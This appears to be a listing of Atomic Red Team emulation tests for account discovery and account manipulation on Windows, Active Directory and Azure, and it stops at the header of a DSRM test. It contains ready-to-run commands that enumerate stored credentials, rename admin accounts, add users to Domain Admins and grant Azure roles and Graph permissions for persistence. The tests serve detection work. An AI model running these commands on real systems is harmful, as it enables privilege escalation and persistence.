
[********BEGIN TEST*******]
Technique: Account Discovery: Local Account T1087.001
Atomic Test Name: Enumerate all accounts on Windows (Local)
Atomic Test Number: 8
Atomic Test GUID: 80887bec-5a9b-4efc-a81d-f83eb2eb32ab
Description: Enumerate all accounts Upon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
net user
dir c:\Users\
cmdkey.exe /list
net localgroup "Users"
net localgroup
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Discovery: Local Account T1087.001
Atomic Test Name: Enumerate all accounts via PowerShell (Local)
Atomic Test Number: 9
Atomic Test GUID: ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b
Description: Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Discovery: Local Account T1087.001
Atomic Test Name: Enumerate logged on users via CMD (Local)
Atomic Test Number: 10
Atomic Test GUID: a138085e-bfe5-46ba-a242-74a6fb884af3
Description: Enumerate logged on users. Upon execution, logged on users will be displayed.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
query user
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Admin Account Manipulate
Atomic Test Number: 1
Atomic Test GUID: 5598f7cb-cf43-455e-883a-f6008c5d46af
Description: Manipulate Admin Account Name

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        $account = $member.Name.Split("\")[-1] # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
        Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
        }
    }

Cleanup Commands:
Command:
$list = Get-LocalUser |?{$_.Description -like "atr:*"}
foreach($u in $list) {
  $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
  Set-LocalUser -Name $u.Name -Description $Matches.Description
  Rename-LocalUser -Name $u.Name -NewName $Matches.Name
  Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Account and Group Manipulate
Atomic Test Number: 2
Atomic Test GUID: a55a22e9-a3d3-42ce-bd48-2653adb8f7a9
Description: Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). 
The quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively, you need to install PS Module ActiveDirectory (in prereqs) and run 
the script with appropriare AD privileges to  create the user and alter the group. Automatic installation of the dependency requires an elevated session,  and is unlikely to work wit
h Powershell Core (untested).
If you consider running this test against a production Active Directory, the good practise is to create a dedicated service account whose delegation is given onto a dedicated OU for 
user creation and deletion, as well as delegated as group manager of the target group.
Example: `Invoke-AtomicTest -Session $session 'T1098' -TestNames "Domain Account and Group Manipulate" -InputArgs @{"group" = "DNSAdmins" }`

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "#{account_prefix}-$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember "#{group}" $account
Command (with inputs):
$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "atr--$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False 
Add-ADGroupMember "Domain Admins" $account

Cleanup Commands:
Command:
Get-ADUser -LDAPFilter "(&(samaccountname=#{account_prefix}-*)(givenName=Test))" | Remove-ADUser -Confirm:$False
Command (with inputs):
Get-ADUser -LDAPFilter "(&(samaccountname=atr--*)(givenName=Test))" | Remove-ADUser -Confirm:$False

Dependencies:
Description: PS Module ActiveDirectory
Check Prereq Command:
Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}
Get Prereq Command:
if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Azure AD - adding user to Azure AD role
Atomic Test Number: 4
Atomic Test GUID: 0e65ae27-5385-46b4-98ac-607a8ee82261
Description: The adversaries want to add user to some Azure AD role. Threat actor  may be interested primarily in highly privileged roles, e.g. Global Administrator, Application Admi
nistrator,  Privileged Authentication Administrator (this role can reset Global Administrator password!). By default, the role Global Reader is assigned to the user principal in this
 test.
The account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.
Detection hint - check Activity "Add member to role" in Azure AD Audit Logs. In targer you will also see User as a type.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential

$user = Get-AzureADUser -Filter "DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'"
if ($user -eq $null) { Write-Warning "User not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"
Command (with inputs):
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzureAD -Credential $Credential

$user = Get-AzureADUser -Filter "DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'"
if ($user -eq $null) { Write-Warning "User not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Reader'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"

Cleanup Commands:
Command:
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$user = Get-AzureADUser -Filter "DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'"
if ($user -eq $null) { Write-Warning "User not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
Write-Host "User $($user.DisplayName) was removed from $($role.DisplayName) role"
Command (with inputs):
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$user = Get-AzureADUser -Filter "DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'"
if ($user -eq $null) { Write-Warning "User not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Reader'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
Write-Host "User $($user.DisplayName) was removed from $($role.DisplayName) role"

Dependencies:
Description: AzureAD module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name AzureAD -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Azure AD - adding service principal to Azure AD role
Atomic Test Number: 5
Atomic Test GUID: 92c40b3f-c406-4d1f-8d2b-c039bf5009e4
Description: The adversaries want to add service principal to some Azure AD role. Threat actor  may be interested primarily in highly privileged roles, e.g. Global Administrator, App
lication Administrator,  Privileged Authentication Administrator (this role can reset Global Administrator password!). By default, the role Global Reader is assigned to service princ
ipal in this test.
The account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.
Detection hint - check Activity "Add member to role" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential

$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '#{service_principal_name}'"
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"
Command (with inputs):
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzureAD -Credential $Credential

$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq 'SuperSP'"
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Reader'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"

Cleanup Commands:
Command:
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '#{service_principal_name}'"
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role"
Command (with inputs):
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq 'SuperSP'"
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Reader'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role"

Dependencies:
Description: AzureAD module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name AzureAD -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Azure - adding user to Azure role in subscription
Atomic Test Number: 6
Atomic Test GUID: 1a94b3fc-b080-450a-b3d8-6d9b57b472ea
Description: The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor  may be interested primarily in highly privileged roles, e.g. Owner, C
ontributor. By default, the role Reader is assigned to user in this test.
New-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.
The account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write  (e.g. such as User Access Administrator or Owner) and the Azure Active Dire
ctory Graph Directory.Read.All  and Microsoft Graph Directory.Read.All permissions.
Detection hint - check Operation Name "Create role assignment" in subscriptions Activity Logs.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential

$user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}" -or $_.UserPrincipalName -eq "#{user_principal_name}" }
if ($user -eq $null) { Write-Warning "User not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
Command (with inputs):
Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzAccount -Credential $Credential

$user = Get-AzADUser | where-object {$_.DisplayName -eq "SuperUser" -or $_.UserPrincipalName -eq "SuperUser" }
if ($user -eq $null) { Write-Warning "User not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "Azure subscription 1"}
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "Reader"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"

Cleanup Commands:
Command:
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}" -or $_.UserPrincipalName -eq "#{user_principal_name}" }
if ($user -eq $null) { Write-Warning "User not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"
Command (with inputs):
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$user = Get-AzADUser | where-object {$_.DisplayName -eq "SuperUser" -or $_.UserPrincipalName -eq "SuperUser" }
if ($user -eq $null) { Write-Warning "User not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "Azure subscription 1"}
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "Reader"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"

Dependencies:
Description: Az.Resources module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name Az.Resources -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Azure - adding service principal to Azure role in subscription
Atomic Test Number: 7
Atomic Test GUID: c8f4bc29-a151-48da-b3be-4680af56f404
Description: The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor  may be interested primarily in highly privileged roles, 
e.g. Owner, Contributor. By default, the role Reader is assigned to service principal in this test.
New-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.
The account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write  (e.g. such as User Access Administrator or Owner) and the Azure Active Dire
ctory Graph Directory.Read.All  and Microsoft Graph Directory.Read.All permissions.
Detection hint - check Operation Name "Create role assignment" in subscriptions Activity Logs.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential

$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"} 
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
Command (with inputs):
Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzAccount -Credential $Credential

$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "SuperSP"}
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "Azure subscription 1"} 
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "Reader"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"

Cleanup Commands:
Command:
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"} 
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"
Command (with inputs):
Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "SuperSP"}
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq "Azure subscription 1"} 
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "Reader"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }

Remove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"

Dependencies:
Description: Az.Resources module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name Az.Resources -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Azure AD - adding permission to application
Atomic Test Number: 8
Atomic Test GUID: 94ea9cc3-81f9-4111-8dde-3fb54f36af4b
Description: The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructu
re. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor. This technique will create a new
 app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: "Get-AzureADApplication" instead of "
New-AzureADServicePrincipal". The DirectoryRecommendations.Read.All permissions has been selected as the default.
The account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.
Detection hint - check Operation Name "Add app role assignment to service principal" in subscriptions Activity Logs. You can also take a look at the materials: https://learnsentinel.
blog/2022/01/04/azuread-privesc-sentinel/ https://github.com/reprise99/Sentinel-Queries https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide
=id.g10460eb209c_0_2766 https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName "#{application_name}"
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'"

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('#{application_permission}')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = "Role"
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host "App permission $permission not found in the Graph Resource API" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$($aadApplication.AppId)'"

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id
Command (with inputs):
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName "test_app"
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter "DisplayName eq 'test_app'"

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('DirectoryRecommendations.Read.All')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = "Role"
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host "App permission $permission not found in the Graph Resource API" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$($aadApplication.AppId)'"

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id

Cleanup Commands:
Command:
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = @(Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'")
If ($aadApplication.Count -eq 0)
{
  Write-Host "App not found: cannot delete it"
  exit
}
ElseIf ($aadApplication.Count -gt 1)
{
  Write-Host "Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required."
  exit
}
Else
{
  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId
  Write-Host "Successfully deleted app"
}
Command (with inputs):
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = @(Get-AzureADApplication -Filter "DisplayName eq 'test_app'")
If ($aadApplication.Count -eq 0)
{
  Write-Host "App not found: cannot delete it"
  exit
}
ElseIf ($aadApplication.Count -gt 1)
{
  Write-Host "Found several app with name 'test_app': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required."
  exit
}
Else
{
  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId
  Write-Host "Successfully deleted app"
}

Dependencies:
Description: AzureAD module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name AzureAD -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Password Change on Directory Service Restore Mode (DSRM) Account
Atomic Test Number: 9
Atomic Test GUID: d5b886d9-d1c7-4b6e-a7b0-460041bf2823
